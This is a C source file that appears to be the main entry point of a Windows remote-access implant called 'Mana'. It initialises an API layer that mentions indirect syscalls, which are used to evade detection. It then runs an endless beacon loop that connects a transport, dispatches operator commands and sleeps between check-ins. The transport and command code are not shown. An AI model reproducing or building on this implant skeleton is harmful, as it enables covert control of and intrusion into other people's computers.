#include <Mana.h>
#include <Config.h>

#include <Core.h>
#include <Transport.h>
#include <Command.h>
#include <ApiWrapper.h>

INSTANCE Instance = { 0 };

INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd )
{
    // Initialize API layer (syscall table if using indirect syscalls)
    if ( !ManaApiInit() )
    {
#ifdef _DEBUG
        printf("[!] Failed to initialize API layer\n");
#endif
        return 1;
    }
    
    ManaInit();
    do
    {
        if ( ! Instance.Session.Connected )
        {
            if ( TransportInit( ) )
                CommandDispatcher();
        }
        
        Sleep( Instance.Config.Sleeping );

    } while ( TRUE );
}